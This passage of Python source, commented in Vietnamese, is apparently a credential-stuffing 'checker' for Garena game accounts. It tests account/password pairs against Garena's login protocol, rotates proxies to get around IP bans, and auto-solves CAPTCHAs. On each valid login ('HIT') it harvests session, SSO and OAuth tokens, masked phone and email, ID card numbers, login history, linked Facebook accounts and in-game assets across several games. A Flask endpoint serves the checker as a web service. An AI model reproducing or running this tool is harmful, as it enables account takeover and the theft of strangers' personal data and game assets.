            here_is_aov = aov_context or _is_aov_record(value)
            record_latest = None
            for raw_key, child in value.items():
                norm_key = _key(raw_key)
                if here_is_aov and norm_key in play_keys:
                    dt = _timestamp(child)
                    if dt is not None and (record_latest is None or dt > record_latest):
                        record_latest = dt
                    if dt is not None and (latest is None or dt > latest):
                        latest = dt
                if here_is_aov and norm_key in reputation_keys and not isinstance(child, bool):
                    try:
                        score = int(float(child))
                        if 0 <= score <= 1000:
                            reputation = score
                    except (TypeError, ValueError):
                        pass
                _walk(child, here_is_aov)
            if record_latest is not None and (
                    latest_match is None or record_latest > latest_match['timestamp']):
                latest_match = {'timestamp': record_latest}
        elif isinstance(value, list):
            for child in value:
                _walk(child, aov_context)

    _walk(player or {}, True)
    _walk(recent_games or {}, False)

    latest_text = 'N/A'
    if latest is not None:
        vn_tz = _dt.timezone(_dt.timedelta(hours=7))
        latest_text = latest.astimezone(vn_tz).strftime('%H:%M:%S %d/%m/%Y (UTC+7)')
    latest_match_text = 'N/A'
    if latest_match is not None:
        vn_tz = _dt.timezone(_dt.timedelta(hours=7))
        latest_match_text = latest_match['timestamp'].astimezone(vn_tz).strftime('%H:%M:%S %d/%m/%Y (UTC+7)')
    return latest_text, reputation if reputation is not None else 'N/A', latest_match_text

# ===== BỎ FILTER REGION - CHO PHÉP TẤT CẢ CÁC NƯỚC =====
def _is_vietnam_server_result(r):
    # Luôn trả về True để check tất cả các nước
    return True

def _normalize_country(code):
    if not code:
        return "UNKNOWN"
    code = str(code).strip().upper()
    mapping = {
        "AF": "AFGHANISTAN", "AL": "ALBANIA", "DZ": "ALGERIA", "AS": "AMERICAN SAMOA",
        "AD": "ANDORRA", "AO": "ANGOLA", "AI": "ANGUILLA", "AQ": "ANTARCTICA",
        "AG": "ANTIGUA AND BARBUDA", "AR": "ARGENTINA", "AM": "ARMENIA", "AW": "ARUBA",
        "AU": "AUSTRALIA", "AT": "AUSTRIA", "AZ": "AZERBAIJAN", "BS": "BAHAMAS",
        "BH": "BAHRAIN", "BD": "BANGLADESH", "BB": "BARBADOS", "BY": "BELARUS",
        "BE": "BELGIUM", "BZ": "BELIZE", "BJ": "BENIN", "BM": "BERMUDA",
        "BT": "BHUTAN", "BO": "BOLIVIA", "BA": "BOSNIA AND HERZEGOVINA", "BW": "BOTSWANA",
        "BR": "BRAZIL", "BN": "BRUNEI DARUSSALAM", "BG": "BULGARIA", "BF": "BURKINA FASO",
        "BI": "BURUNDI", "KH": "CAMBODIA", "CM": "CAMEROON", "CA": "CANADA",
        "CV": "CAPE VERDE", "KY": "CAYMAN ISLANDS", "CF": "CENTRAL AFRICAN REPUBLIC",
        "TD": "CHAD", "CL": "CHILE", "CN": "CHINA", "CO": "COLOMBIA",
        "KM": "COMOROS", "CG": "CONGO", "CD": "CONGO, THE DEMOCRATIC REPUBLIC OF THE",
        "CK": "COOK ISLANDS", "CR": "COSTA RICA", "HR": "CROATIA", "CU": "CUBA",
        "CY": "CYPRUS", "CZ": "CZECH REPUBLIC", "DK": "DENMARK", "DJ": "DJIBOUTI",
        "DM": "DOMINICA", "DO": "DOMINICAN REPUBLIC", "EC": "ECUADOR", "EG": "EGYPT",
        "SV": "EL SALVADOR", "GQ": "EQUATORIAL GUINEA", "ER": "ERITREA", "EE": "ESTONIA",
        "ET": "ETHIOPIA", "FJ": "FIJI", "FI": "FINLAND", "FR": "FRANCE",
        "GA": "GABON", "GM": "GAMBIA", "GE": "GEORGIA", "DE": "GERMANY",
        "GH": "GHANA", "GI": "GIBRALTAR", "GR": "GREECE", "GL": "GREENLAND",
        "GD": "GRENADA", "GP": "GUADELOUPE", "GU": "GUAM", "GT": "GUATEMALA",
        "GN": "GUINEA", "GW": "GUINEA-BISSAU", "GY": "GUYANA", "HT": "HAITI",
        "HN": "HONDURAS", "HK": "HONG KONG", "HU": "HUNGARY", "IS": "ICELAND",
        "IN": "INDIA", "ID": "INDONESIA", "IR": "IRAN", "IQ": "IRAQ",
        "IE": "IRELAND", "IL": "ISRAEL", "IT": "ITALY", "JM": "JAMAICA",
        "JP": "JAPAN", "JO": "JORDAN", "KZ": "KAZAKHSTAN", "KE": "KENYA",
        "KI": "KIRIBATI", "KR": "KOREA, REPUBLIC OF", "KW": "KUWAIT", "KG": "KYRGYZSTAN",
        "LV": "LATVIA", "LB": "LEBANON", "LS": "LESOTHO", "LR": "LIBERIA",
        "LY": "LIBYA", "LI": "LIECHTENSTEIN", "LT": "LITHUANIA", "LU": "LUXEMBOURG",
        "MO": "MACAO", "MK": "MACEDONIA", "MG": "MADAGASCAR", "MW": "MALAWI",
        "MY": "MALAYSIA", "MV": "MALDIVES", "ML": "MALI", "MT": "MALTA",
        "MH": "MARSHALL ISLANDS", "MQ": "MARTINIQUE", "MR": "MAURITANIA", "MU": "MAURITIUS",
        "YT": "MAYOTTE", "MX": "MEXICO", "FM": "MICRONESIA", "MD": "MOLDOVA",
        "MC": "MONACO", "MN": "MONGOLIA", "ME": "MONTENEGRO", "MS": "MONTSERRAT",
        "MA": "MOROCCO", "MZ": "MOZAMBIQUE", "MM": "MYANMAR", "NA": "NAMIBIA",
        "NR": "NAURU", "NP": "NEPAL", "NL": "NETHERLANDS", "NC": "NEW CALEDONIA",
        "NZ": "NEW ZEALAND", "NI": "NICARAGUA", "NE": "NIGER", "NG": "NIGERIA",
        "NU": "NIUE", "NF": "NORFOLK ISLAND", "MP": "NORTHERN MARIANA ISLANDS",
        "NO": "NORWAY", "OM": "OMAN", "PK": "PAKISTAN", "PW": "PALAU",
        "PS": "PALESTINE", "PA": "PANAMA", "PG": "PAPUA NEW GUINEA", "PY": "PARAGUAY",
        "PE": "PERU", "PH": "PHILIPPINES", "PN": "PITCAIRN", "PL": "POLAND",
        "PT": "PORTUGAL", "PR": "PUERTO RICO", "QA": "QATAR", "RE": "RÉUNION",
        "RO": "ROMANIA", "RU": "RUSSIAN FEDERATION", "RW": "RWANDA", "KN": "SAINT KITTS AND NEVIS",
        "LC": "SAINT LUCIA", "VC": "SAINT VINCENT AND THE GRENADINES", "WS": "SAMOA",
        "SM": "SAN MARINO", "ST": "SAO TOME AND PRINCIPE", "SA": "SAUDI ARABIA",
        "SN": "SENEGAL", "RS": "SERBIA", "SC": "SEYCHELLES", "SL": "SIERRA LEONE",
        "SG": "SINGAPORE", "SK": "SLOVAKIA", "SI": "SLOVENIA", "SB": "SOLOMON ISLANDS",
        "SO": "SOMALIA", "ZA": "SOUTH AFRICA", "SS": "SOUTH SUDAN", "ES": "SPAIN",
        "LK": "SRI LANKA", "SD": "SUDAN", "SR": "SURINAME", "SZ": "SWAZILAND",
        "SE": "SWEDEN", "CH": "SWITZERLAND", "SY": "SYRIAN ARAB REPUBLIC", "TW": "TAIWAN",
        "TJ": "TAJIKISTAN", "TZ": "TANZANIA", "TH": "THAILAND", "TL": "TIMOR-LESTE",
        "TG": "TOGO", "TK": "TOKELAU", "TO": "TONGA", "TT": "TRINIDAD AND TOBAGO",
        "TN": "TUNISIA", "TR": "TURKEY", "TM": "TURKMENISTAN", "TV": "TUVALU",
        "UG": "UGANDA", "UA": "UKRAINE", "AE": "UNITED ARAB EMIRATES", "GB": "UNITED KINGDOM",
        "US": "UNITED STATES", "UY": "URUGUAY", "UZ": "UZBEKISTAN", "VU": "VANUATU",
        "VE": "VENEZUELA", "VN": "VIET NAM", "YE": "YEMEN", "ZM": "ZAMBIA",
        "ZW": "ZIMBABWE",
        "84": "VIETNAM", "63": "PHILIPPINES", "66": "THAILAND", "62": "INDONESIA",
        "65": "SINGAPORE", "60": "MALAYSIA", "886": "TAIWAN", "91": "INDIA",
        "95": "MYANMAR", "855": "CAMBODIA", "856": "LAOS",
    }
    return mapping.get(code, code)

def _translate_aov_rank(rank_str):
    if not rank_str: return rank_str
    s = rank_str.lower()
    if 'บรอนซ์' in s or 'bronze' in s or '青銅' in s: return 'Đồng'
    if 'ซิลเวอร์' in s or 'silver' in s or '白銀' in s: return 'Bạc'
    if 'โกลด์' in s or 'gold' in s or '黃金' in s: return 'Vàng'
    if 'แพลทินัม' in s or 'platinum' in s or '鉑金' in s: return 'Bạch Kim'
    if 'ไดมอนด์' in s or 'diamond' in s or '鑽石' in s: return 'Kim Cương'
    if 'คอมมานเดอร์' in s or 'commander' in s or '星耀' in s: return 'Tinh Anh'
    if 'กลอเรียสรูเลอร์' in s or 'glorious ruler' in s: return 'Thách Đấu'
    if 'ซูพรีมคอนเควอร์เรอร์' in s or 'supreme conqueror' in s or '璀璨傳說' in s: return 'Chiến Tướng'
    if 'คอนเควอร์เรอร์' in s or 'conqueror' in s or 'master' in s or '戰場傳說' in s: return 'Cao Thủ'
    return rank_str

# ======================= CORE CHECK LOGIN ==================================
_PROXY_ERRORS = (
    'Proxy closed connection',
    'Proxy CONNECT failed',
    'No connection could be made',
    'Connection dropped',
    'target machine actively refused',
    'A connection attempt failed',
    'connected party did not properly respond',
    'getaddrinfo failed',
    'Connection refused',
)
_TIMEOUT_ERRORS = ('timed out', 'TimeoutError')

def _is_proxy_error(detail):
    if not detail:
        return False
    return any(err in detail for err in _PROXY_ERRORS)

def _is_timeout_error(detail):
    if not detail:
        return False
    return any(err in detail for err in _TIMEOUT_ERRORS)

def _is_port_exhaustion(detail):
    if not detail:
        return False
    return '10048' in detail or 'Only one usage' in detail

def check_login(account, password, timeout=7, fetch_info=False, proxy=None, debug=False):
    result = None
    proxy_fails = 0
    no_proxy_mode = (proxy is None and not _proxy_list)
    max_retries = 2 if no_proxy_mode else 4

    for _retry in range(max_retries):
        if proxy is None and _proxy_list:
            proxy = _next_proxy()
        result = _check_login_once(account, password, timeout, fetch_info, proxy, debug=debug)
        detail = result.get('detail', '')
        status = result.get('status', '')
        if status == 'HIT':
            return result
        if 'result=3' in detail:
            return result
        if 'result=101' in detail:
            return result
        if _is_port_exhaustion(detail):
            time.sleep(0.3)
            proxy = _next_proxy() if _proxy_list else None
            continue
        if status == 'TIMEOUT' and no_proxy_mode:
            result['status'] = 'PORT_BLOCKED'
            result['detail'] = 'Port 19000 bi chan (ISP/Garena ban IP). Dung proxy de bypass.'
            return result
        if status in ('ERROR', 'TIMEOUT') or _is_proxy_error(detail):
            proxy_fails += 1
            proxy = _next_proxy() if _proxy_list else None
            time.sleep(0.3)
            continue
        if detail == 'Empty LoginReply data':
            proxy = _next_proxy() if _proxy_list else None
            continue
        return result
    if result:
        if no_proxy_mode and result.get('status') == 'TIMEOUT':
            result['status'] = 'PORT_BLOCKED'
            result['detail'] = 'Port 19000 bi chan (ISP/Garena ban IP). Dung proxy de bypass.'
        elif proxy_fails >= 3:
            result['status'] = 'PROXY_FAIL'
            result['detail'] = f'proxy_error x{proxy_fails}'
    return result

def _check_login_once(account, password, timeout, fetch_info, proxy, debug):
    global _HOST_IP
    _conn_sem.acquire()
    sock = None
    dbg = {}
    try:
        host_ip = _resolve_host_ip()
        if proxy:
            sock = _connect_via_proxy(proxy, host_ip, PORT, timeout)
        else:
            for _attempt in range(3):
                try:
                    sock = _make_fast_socket(timeout)
                    sock.connect((host_ip, PORT))
                    break
                except OSError as _e:
                    try: sock.close()
                    except: pass
                    sock = None
                    if getattr(_e, 'winerror', None) == 10048 and _attempt < 2:
                        time.sleep(0.5 * (_attempt + 1))
                        continue
                    raise

        rand_key  = os.urandom(16)
        prep_body = _build_login_prepare(account, rand_key)
        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5)
        result_code = hdr.get(5, 0)
        if debug:
            dbg.update({"prepare_result": result_code, "prepare_body_len": len(body) if body else 0})
        if result_code != 0:
            if result_code == 3 and requests:
                # CAPTCHA: try to solve automatically
                for attempt_solve in range(3):
                    ckey, ctext = _solve_garena_captcha(proxy_dict=_get_http_proxies(proxy))
                    if ckey and ctext:
                        if len(ctext) >= 5:
                            if debug: dbg[f"tcp_captcha_solve_attempt_{attempt_solve}"] = ctext
                            prep_body = _build_login_prepare(account, rand_key, captcha_key=ckey, captcha=ctext)
                            sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))
                            hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5)
                            result_code = hdr.get(5, 0)
                            if debug: dbg[f"tcp_captcha_solve_result_{attempt_solve}"] = result_code
                            if result_code == 0:
                                break
                            elif result_code != 3:
                                break
                    else:
                        break
            if result_code != 0:
                status_map = {
                    1: ("INVALID",    f"WRONG_PASSWORD result={result_code}"),
                    2: ("NOT_FOUND",  f"ACCOUNT_NOT_EXIST result={result_code}"),
                    3: ("CAPTCHA",    f"PREPARE_CAPTCHA result={result_code}"),
                    4: ("BANNED",     f"USER_BANNED result={result_code}"),
                    5: ("SEC_BANNED", f"SECURITY_BANNED result={result_code}"),
                }
                status, detail = status_map.get(result_code, ("MISS", f"PREPARE_FAIL result={result_code}"))
                out = {"account": account, "password": password, "status": status, "detail": detail}
                if debug: out["debug"] = dbg
                return out

        prep_reply = _proto_decode(body)
        reply_key  = prep_reply.get(1, b'')
        reply_data = prep_reply.get(2, b'')
        if not reply_key or not reply_data:
            out = {"account": account, "password": password, "status": "ERROR", "detail": "Empty LoginPrepareReply"}
            if debug: out["debug"] = dbg
            return out

        prep_data   = _proto_decode(xtea_decrypt(reply_data, reply_key))
        salt        = prep_data.get(1, b'').decode('utf-8') if isinstance(prep_data.get(1, b''), bytes) else prep_data.get(1, '')
        verify_code = prep_data.get(2, b'').decode('utf-8') if isinstance(prep_data.get(2, b''), bytes) else prep_data.get(2, '')

        login_body, xtea_key = _build_login(account, password, salt, verify_code)
        sock.sendall(_build_frame(CMD_LOGIN, login_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN, max_tries=5)
        result_code = hdr.get(5, 0)
        if result_code != 0:
            out = {"account": account, "password": password, "status": "INVALID", "detail": f"LOGIN_FAIL result={result_code}"}
            if debug: out["debug"] = dbg
            return out

        login_reply = _proto_decode(body)
        enc_reply   = login_reply.get(1, b'')
        if not enc_reply:
            out = {"account": account, "password": password, "status": "ERROR", "detail": "Empty LoginReply data"}
            if debug: out["debug"] = dbg
            return out

        reply_decoded = _proto_decode(xtea_decrypt(enc_reply, xtea_key))
        uid           = reply_decoded.get(1, 0)
        session_key   = reply_decoded.get(2, b'')
        if not uid:
            out = {"account": account, "password": password, "status": "ERROR", "detail": "UID=0 in reply"}
            if debug: out["debug"] = dbg
            return out

        result = {
            "account": account, "password": password, "status": "HIT",
            "uid": uid,
            "session_key": session_key.hex() if isinstance(session_key, bytes) else "",
        }
        if debug: result["debug"] = dbg

        if fetch_info and isinstance(session_key, bytes) and len(session_key) == 16:
            import datetime as _dt
            # Fast check for Vietnam server
            login_info_fast = _fetch_login_info(sock, session_key)
            result.update({
                'region': login_info_fast.get('region', ''),
                'shells': login_info_fast.get('shells', 0),
                'topup_time': login_info_fast.get('topup_time', 0),
            })
            # BỎ FILTER REGION
            # if not _is_vietnam_server_result(result):
            #     result['status'] = 'FILTERED'
            #     result['detail'] = 'NON_VIETNAM_SERVER'
            #     return result

            # Check ban via kientuong
            oauth = _fetch_oauth_token(sock, session_key, LIEN_QUAN_APP_ID)
            aov_token = oauth.get('access_token', '')
            kt = {}
            if aov_token:
                result['aov_access_token'] = aov_token
                kt = _fetch_kientuong_player(sock, session_key, proxy=proxy)
                if _is_banned_info(kt.get('banned', 'NO')):
                    result['aov_banned'] = 'YES'
                    result['status'] = 'BANNED'
                    result['detail'] = 'AOV_BANNED'
                    return result

            # Fetch all info
            login_info = _fetch_login_info(sock, session_key)
            result.update({
                "region":     login_info.get('region', ''),
                "shells":     login_info.get('shells', 0),
                "topup_time": login_info.get('topup_time', 0),
            })
            ll = login_info.get('last_login', 0)
            if ll:
                result['last_login'] = _dt.datetime.fromtimestamp(ll).strftime('%Y-%m-%d %H:%M:%S')
            ct = login_info.get('created_time', 0)
            if ct:
                result['garena_created'] = _dt.datetime.fromtimestamp(ct).strftime('%H:%M:%S %d-%m-%Y')
            if login_info.get('fb_uid_login'):
                result['fb_uid'] = login_info['fb_uid_login']
            if login_info.get('fb_link_time'):
                result['fb_link_time'] = _dt.datetime.fromtimestamp(login_info['fb_link_time']).strftime('%d-%m-%Y')
            if login_info.get('last_session_ip'):
                result['last_session_ip'] = login_info['last_session_ip']
            if login_info.get('last_session_country'):
                result['last_session_country'] = login_info['last_session_country']
            if login_info.get('last_session_time'):
                result['last_session_time'] = _dt.datetime.fromtimestamp(login_info['last_session_time']).strftime('%d-%m-%Y %H:%M')

            basic = _fetch_user_basic(sock, uid, session_key)
            result.update({
                "username": basic.get('username', ''),
                "nickname": basic.get('nickname', ''),
            })

            acct = _fetch_account_info(sock, session_key)
            result.update({
                "password_set":    acct.get('password_set', False),
                "email_verified":  acct.get('email_verified', False),
                "mobile_bound":    acct.get('mobile_bound', False),
                "account_secured": acct.get('account_secured', False),
            })

            fb = _fetch_fb_info(sock, session_key)
            result['fb_linked'] = fb.get('fb_linked', False)

            sso = _fetch_sso_key(sock, session_key)
            sso_key = sso.get('sso_key', '')
            result['sso_key'] = sso_key

            # Parallel HTTP fetches
            _pool = ThreadPoolExecutor(max_workers=20)
            _futs = {}
            if sso_key:
                _futs['acct_sec'] = _pool.submit(_fetch_account_security, sso_key, proxy)
                _futs['uac']      = _pool.submit(_fetch_uac_country, sso_key, proxy)

            tok = _fetch_session_token(sock, session_key)
            session_token = tok.get('session_token', '')
            result['session_token'] = session_token
            http_key = session_token or sso_key
            if http_key:
                _futs['rg'] = _pool.submit(_fetch_recent_games, http_key, proxy)

            # AoV redirect URL for sale skins
            sale_redirect = _get_app_redirect_url(sock, session_key,
                                                   "https://sale.lienquan.garena.vn/login/callback")
            region = result.get("region", "VN") or "VN"
            if aov_token:
                _futs['weekly']   = _pool.submit(_fetch_weekly_profile, aov_token, proxy)
                _futs['aov_info'] = _pool.submit(_fetch_aov_user_info, aov_token, region, proxy)
            if sale_redirect:
                _futs['skins'] = _pool.submit(_fetch_sale_skins, sale_redirect, proxy)

            # RoV Thailand
            if sso_key:
                _futs['rov_th'] = _pool.submit(_fetch_rov_th_via_termgame, sso_key, proxy)
            rov_oauth = _fetch_oauth_token(sock, session_key, ROV_TH_APP_ID)
            rov_token = rov_oauth.get('access_token', '')
            if rov_token:
                _futs['rov_skins'] = _pool.submit(_fetch_sale_skins, rov_token, proxy)

            # FC Mobile
            fc_oauth = _fetch_oauth_token(sock, session_key, FC_MOBILE_VN_APP_ID)
            fc_token = fc_oauth.get("access_token", "")
            if fc_token:
                _futs['fc_info'] = _pool.submit(_fetch_fc_mobile_vn_user_info, fc_token, region, proxy)
                _futs['fc_me']   = _pool.submit(_fetch_fcmobile_me_from_access_token, fc_token, proxy)
                if sso_key:
                    _futs['fc_sso_pm'] = _pool.submit(_fetch_fc_prefill_via_sso, sso_key, proxy)

            # Delta Force
            if sso_key:
                _futs['df'] = _pool.submit(_fetch_delta_force_info, sso_key, proxy)

            # Collect results
            _hr = {}
            for _k, _f in _futs.items():
                try:
                    _t = 10 if _k == 'acct_sec' else (25 if _k == 'df' else 6)
                    _hr[_k] = _f.result(timeout=_t)
                except Exception:
                    _hr[_k] = {}

            acct_sec = _hr.get('acct_sec') or {}
            result['_acct_sec_ok'] = bool(acct_sec)
            if acct_sec:
                result['masked_phone'] = acct_sec.get('masked_phone', '')
                result['masked_email'] = acct_sec.get('masked_email', '')
                result['email_v'] = acct_sec.get('email_v', 0)
                result['idcard'] = acct_sec.get('idcard', '')
                result['authenticator_enable'] = acct_sec.get('authenticator_enable', 0)
                result['two_step_verify'] = acct_sec.get('two_step_verify', 0)
                if acct_sec.get('country_code'):
                    result['country_code'] = str(acct_sec.get('country_code', '')).strip()
                if acct_sec.get('acc_country'):
                    result['acc_country'] = str(acct_sec.get('acc_country', '')).strip()
                if acct_sec.get('country'):
                    result['country'] = acct_sec.get('country', '')
                if acct_sec.get('fb_connected'):
                    result['fb_linked'] = True
                if acct_sec.get('fb_account'):
                    result['fb_account_name'] = acct_sec['fb_account']
                result['suspicious'] = int(acct_sec.get('suspicious', 0) or 0)
                if acct_sec.get('login_history'):
                    result['login_history'] = acct_sec['login_history']
                if acct_sec.get('sensitive_ops'):
                    result['sensitive_ops'] = acct_sec['sensitive_ops']
                if acct_sec.get('init_ip'):
                    result['init_ip'] = acct_sec['init_ip']

            rg = _hr.get('rg')
            if rg:
                result['recent_games'] = rg

            cc = (result.get('country_code') or "").strip()
            if not cc:
                mp = (result.get("masked_phone") or "").strip()
                mcc = re.match(r"^\+(\d{1,4})\b", mp)
                if mcc:
                    cc = mcc.group(1)
                    result["country_code"] = cc

            uac_country = _hr.get('uac') or ""
            if uac_country and not (result.get("acc_country") or "").strip():
                result["acc_country"] = uac_country

            country_from_init = result.get("country", "")
            acc_raw = (result.get("acc_country") or "").strip()
            _country_candidates = [cc, acc_raw, country_from_init, uac_country,
                                   (result.get('region', '') or '').strip().upper()]
            _resolved = "UNKNOWN"
            for _raw in _country_candidates:
                if not _raw: continue
                _n = _normalize_country(_raw)
                if _n and _n != "UNKNOWN":
                    _resolved = _n
                    break
            result["country"] = _resolved

            # AOV skins and rank
            if aov_token:
                skins = _hr.get('skins')
                if skins:
                    result['aov_skins'] = skins
                    if skins.get('item_history'):
                        result['aov_item_history'] = skins['item_history']

                weekly = _hr.get('weekly') or {}
                if weekly:
                    result['aov_name'] = weekly.get('name', '')
                    rank_base  = weekly.get('rank', '')
                    rank_stars = int(weekly.get('rank_stars') or 0)
                    result['aov_rank_id']    = weekly.get('rank_id')
                    result['aov_rank_stars'] = rank_stars
                    result['aov_rank_entry'] = weekly.get('rank_entry', {})
                    if rank_stars and rank_base:
                        r_low = rank_base.lower()
                        if 'cao th' in r_low or 'master' in r_low:
                            result['aov_rank'] = f"{rank_base} {rank_stars}"
                        else:
                            result['aov_rank'] = rank_base
                    else:
                        result['aov_rank'] = rank_base

                if kt:
                    result['aov_level']    = kt.get('level', 0)
                    result['aov_reg_time'] = kt.get('register_time', '')
                    result['aov_banned']   = 'YES' if _is_yes(kt.get('banned', 'NO')) else 'NO'
                    kt_stars = int(kt.get('rank_stars') or 0)
                    kt_rank  = kt.get('rank')
                    if kt_stars > 0:
                        result['aov_rank_stars'] = kt_stars
                        r_base = result.get('aov_rank') or kt_rank or 'Cao Thủ'
                        r_base = re.sub(r'\s*\d+$', '', r_base)
                        r_low  = r_base.lower()
                        if 'cao th' in r_low or 'master' in r_low:
                            result['aov_rank'] = f"{r_base} {kt_stars}"
                        else:
                            result['aov_rank'] = r_base
                    elif not result.get('aov_rank') and kt_rank:
                        rank_base = kt_rank
                        r_low = rank_base.lower()
                        result['aov_rank_stars'] = kt_stars
                        if kt_stars and ('cao th' in r_low or 'master' in r_low):
                            result['aov_rank'] = f"{rank_base} {kt_stars}"
                        else:
                            result['aov_rank'] = rank_base
                        result['aov_rank_source'] = 'kientuong'
                    result['_kt_player'] = kt.get('_raw_player', {})

                last_played, reputation, latest_match = _extract_aov_activity(
                    result.get('recent_games'), result.get('_kt_player'))
                result['aov_last_played_at'] = last_played
                result['aov_reputation'] = reputation
                result['aov_latest_match'] = latest_match

                aov_info = _hr.get('aov_info') or {}
                result["aov_user_info"] = aov_info
                try:
                    if isinstance(aov_info, dict):
                        result["aov_prefill_mobile"] = ((aov_info.get("data") or {}).get("prefill_mobile") or "").strip()
                except Exception:
                    pass

            # ROV TH
            if rov_token:
                rov_skins = _hr.get('rov_skins') or {}
                if rov_skins and (rov_skins.get('total_skins') or rov_skins.get('cp')):
                    result['rov_skins'] = rov_skins

            rov_th = _hr.get('rov_th') or {}
            if rov_th:
                result['rov_th'] = rov_th
                if rov_th.get('uac') and not result.get('country_code'):
                    result['country_code'] = rov_th.get('uac')
                rov_name = (rov_th.get('rov_role_name') or '').strip()
                tg_user  = (rov_th.get('tg_username')   or '').strip()
                has_real_name = rov_name and rov_name != tg_user
                if (rov_th.get('has_rov_role') or has_real_name) and not (result.get('aov_name') or '').strip():
                    result['aov_name'] = rov_name
                if rov_th.get('aov_server'):
                    result['aov_server'] = rov_th['aov_server']
                    result['aov_server_id'] = rov_th.get('aov_server_id', 0)
                if rov_th.get('aov_tg_name') and not (result.get('aov_name') or '').strip():
                    result['aov_name'] = rov_th['aov_tg_name']
                if rov_th.get('rov_role_name'):
                    result['rov_name']        = rov_th['rov_role_name']
                    result['rov_server']      = rov_th.get('rov_server', '')
                    result['rov_server_id']   = rov_th.get('rov_server_id', 0)
                    result['rov_role_id']     = rov_th.get('rov_role_id', 0)
                    result['rov_open_id']     = rov_th.get('rov_open_id', '')
                    result['has_rov_role']    = rov_th.get('has_rov_role', False)
                cur_qh = ((result.get('aov_skins') or {}).get('cp', 0) or 0)
                if rov_th.get('shells') and not cur_qh:
                    result.setdefault('aov_skins', {})['cp'] = rov_th.get('shells')
                tg_mob = (rov_th.get('tg_display_mobile') or '').strip()
                if tg_mob and not (result.get('masked_phone') or '').strip():
                    result['masked_phone'] = tg_mob
                if rov_th.get('tg_is_verified'):
                    result['garena_verified'] = True

            # FC Mobile
            if fc_token:
                result["fc_mobile_vn_access_token"] = fc_token
                fc_info = _hr.get('fc_info') or {}
                result["fc_mobile_vn_user_info"] = fc_info
                try:
                    if isinstance(fc_info, dict):
                        result["fcmobile_prefill_mobile"] = ((fc_info.get("data") or {}).get("prefill_mobile") or "").strip()
                except Exception:
                    pass

                sso_pm = (_hr.get('fc_sso_pm') or '').strip()
                if sso_pm:
                    result["fcmobile_prefill_mobile"] = sso_pm
                    if "*" not in sso_pm:
                        result["aov_prefill_mobile"] = sso_pm
                fm = _hr.get('fc_me') or {}
                if fm:
                    result["fcmobile_web_host"] = fm.get("host")
                    result["ss_fcm"]            = fm.get("ss_fcm")
                    result["fcmobile_user"]     = fm.get("user") or {}
                    result["fcmobile_ovr"]      = fm.get("ovr")
                    result["fcmobile_uid"]      = fm.get("uid")
                    result["fcmobile_name"]     = fm.get("name")
                    result["fcmobile_rankTCN"]  = fm.get("rankTCN")
                    result["fcmobile_rankDDC"]  = fm.get("rankDDC")
                    result["fcmobile_rankDGL"]  = fm.get("rankDGL")
                    result["fcmobile_point"]    = fm.get("point")

            # Delta Force
            df = _hr.get('df') or {}
            if df:
                result['delta_force'] = df
                if df.get('df_has_data'):
                    result['df_nickname'] = df.get('df_nickname', '')
                    result['df_level'] = df.get('df_level', 0)
                    result['df_rank'] = df.get('df_rank', '')
                    result['df_matches'] = df.get('df_matches', 0)
                    result['df_wins'] = df.get('df_wins', 0)
                    result['df_kd'] = df.get('df_kd', '')
                    result['df_uid_game'] = df.get('df_uid_game', '')

            _pool.shutdown(wait=False)

        if result.get("aov_rank"):
            base_r = re.sub(r'\s*\d+$', '', result["aov_rank"]).strip()
            trans_r = _translate_aov_rank(base_r)
            stars = result.get("aov_rank_stars", 0)
            if stars > 0 and trans_r in ("Cao Thủ", "Chiến Tướng"):
                result["aov_rank"] = f"{trans_r} {stars}"
            else:
                result["aov_rank"] = trans_r

        return result

    except socket.timeout:
        timed_out_ip = _HOST_IP
        with _HOST_IP_lock:
            _HOST_IP = None
        out = {
            "account": account,
            "password": password,
            "status": "TIMEOUT",
            "detail": f"Socket timeout to {HOST}:{PORT} (ip={timed_out_ip or 'unknown'})",
        }
        if debug: out["debug"] = dbg
        return out
    except Exception as exc:
        out = {"account": account, "password": password, "status": "ERROR", "detail": str(exc)}
        if debug: out["debug"] = dbg
        return out
    finally:
        if sock:
            try: sock.close()
            except: pass
        _conn_sem.release()

# ======================= MAIN ENTRY ========================================
# Tạo Flask app để có thể import và chạy trên Render
try:
    from flask import Flask, request, jsonify
except ImportError:
    Flask = None

app = None
if Flask is not None:
    app = Flask(__name__)

    @app.route('/check')
    def api_check():
        user = request.args.get('user')
        password = request.args.get('pass')
        if not user or not password:
            return jsonify({"ok": False, "error": "Missing user or pass"})
        # Lấy proxy nếu có
        proxy = _next_proxy() if _proxy_list else None
        result = check_login(user, password, fetch_info=True, proxy=proxy)
        return jsonify({"ok": True, "result": result})

if __name__ == "__main__":
    if Flask is None:
        print("Flask not installed. Please install: pip install flask")
        sys.exit(1)
    # Load proxy file nếu biến môi trường PROXY_FILE được set
    proxy_env = os.environ.get("PROXY_FILE")
    if proxy_env and os.path.isfile(proxy_env):
        load_proxies(proxy_env)
        print(f"Loaded {len(_proxy_list)} proxies from {proxy_env}")
    # Lấy cổng từ biến môi trường Render (mặc định 5000)
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
